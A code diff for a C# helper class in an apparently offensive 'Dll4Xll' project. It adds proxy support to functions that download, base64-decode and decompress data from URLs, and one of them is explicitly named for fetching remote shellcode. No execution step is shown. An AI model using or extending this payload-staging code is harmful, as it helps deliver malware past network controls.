@@ -37,21 +37,20 @@ namespace Dll4Xll
             return encodedString;
         }
 
-        public static string CompressAndEncodeUrl(string url)
+        public static string CompressAndEncodeUrl(string url, IWebProxy proxy = null)
         {
             byte[] inputBytes;
             using (var client = new WebClient())
             {
+                client.Proxy = proxy;
                 inputBytes = client.DownloadData(url);
-            }      
+            }
             // Compress the input bytes
             byte[] compressedBytes = CompressData(inputBytes);
             // Encode the compressed bytes in base64
             string encodedString = Convert.ToBase64String(compressedBytes);
             return encodedString;
         }
-
-
 
         public static void DecodeAndDecompressFile(string inputFile, string outputFile)
         {
@@ -75,11 +74,12 @@ namespace Dll4Xll
             return decompressedData;
         }
 
-        public static byte[] DecodeAndDecompressUrl(string url)
+        public static byte[] DecodeAndDecompressUrl(string url, IWebProxy proxy = null)
         {
             byte[] shellcode;
             using (WebClient client = new WebClient())
             {
+                client.Proxy = proxy;
                 string encodedShellcode = client.DownloadString(url);
                 byte[] decodedBytes = SkavenCode.DecodeFromBase64Url(encodedShellcode);
                 using (MemoryStream inputStream = new MemoryStream(decodedBytes))
@@ -119,11 +119,12 @@ namespace Dll4Xll
             File.WriteAllBytes(outputFile, compressedBytes);
         }
 
-        public static byte[] CompressFromUrl(string url, string outputFile = null)
+        public static byte[] CompressFromUrl(string url, string outputFile = null, IWebProxy proxy = null)
         {
             byte[] compressedData;
             using (WebClient client = new WebClient())
             {
+                client.Proxy = proxy;
                 compressedData = client.DownloadData(url);
             }
 
@@ -146,9 +147,6 @@ namespace Dll4Xll
                 return compressedData;
             }
         }
-
-
-
 
         public static byte[] DecompressData(byte[] inputBytes)            
         {
@@ -174,11 +172,12 @@ namespace Dll4Xll
             File.WriteAllBytes(outputFile, decompressedBytes);
         }
 
-        public static byte[] DecompressFromUrl(string url, string outputFile = null)
+        public static byte[] DecompressFromUrl(string url, string outputFile = null, IWebProxy proxy = null)
         {
             byte[] decompressedData;
             using (WebClient client = new WebClient())
             {
+                client.Proxy = proxy;
                 byte[] inputBytes = client.DownloadData(url);
                 using (MemoryStream ms = new MemoryStream(inputBytes))
                 {
@@ -192,7 +191,6 @@ namespace Dll4Xll
                     }
                 }
             }
-
             if (outputFile != null)
             {
                 File.WriteAllBytes(outputFile, decompressedData);
@@ -217,12 +215,13 @@ namespace Dll4Xll
             File.WriteAllText(outputFile, encodedData);
         }
 
-        public static string EncodeToBase64Url(string url)
+        public static string EncodeToBase64Url(string url, IWebProxy proxy = null)
         {
             using (WebClient client = new WebClient())
             {
-                string String = client.DownloadString(url);
-                byte[] inputBytes = Encoding.UTF8.GetBytes(String);
+                client.Proxy = proxy;
+                string inputString = client.DownloadString(url);
+                byte[] inputBytes = Encoding.UTF8.GetBytes(inputString);
                 string encodedData = Convert.ToBase64String(inputBytes);
                 return encodedData;
             }
@@ -242,16 +241,16 @@ namespace Dll4Xll
             File.WriteAllBytes(outputFile, decodedBytes);
         }
 
-        public static byte[] DecodeFromBase64Url(string url)
+        public static byte[] DecodeFromBase64Url(string url, IWebProxy proxy = null)
         {
             using (WebClient client = new WebClient())
             {
+                client.Proxy = proxy;
                 string base64String = client.DownloadString(url);
                 byte[] inputBytes = Convert.FromBase64String(base64String);
                 return inputBytes;
             }
         }
-
     }
 }
 
